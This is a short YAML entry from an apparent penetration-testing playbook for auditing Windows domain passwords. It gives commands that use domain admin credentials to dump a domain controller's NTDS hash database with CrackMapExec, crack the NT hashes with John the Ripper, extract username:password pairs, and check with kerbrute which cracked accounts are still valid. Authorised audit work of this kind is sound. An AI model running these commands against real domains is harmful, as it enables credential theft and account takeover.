name: windows_domain_password_audit

info:
  title: Windows Domain Password Audit
  author: evait security GmbH
  book: internal-pentest
  category: 04_windows_domain
  placeholder: 
    - SMBUser
    - SMBPass
    - SMBDomain
    - SMBDomainController
  references:
    - https://www.openwall.com/john/
    - https://hashcat.net/hashcat/

content: |
  <h3>NTDS dump directly from the dc using domain admin credentials</h3>
  <code>cme smb @@SMBDomainController -u @@SMBUser -p @@SMBPass -d @@SMBDomain --ntds vss</code>
  <p>Run john for ~20 minutes with default options to find weak passwords<p>
  <code>john --format=NT FILEPATH.ntds</code>
  <p>Show passwords and filter only username and password with colon as separator<p>
  <code>john --format=NT FILEPATH.ntds --show | cut -d ":" -f1,2 | cut -d '\' -f 2 | ag ":" | ag -v ':\n' > weak_user_pass_all.txt</code>
  <p>Use kerbrute in order to test valid logins and filtering out invalid accounts<p>
  <code>kerbrute --dc @@SMBDomainController -d @@SMBDomain bruteforce weak_user_pass_all.txt -o weak_user_pass_active.txt</code>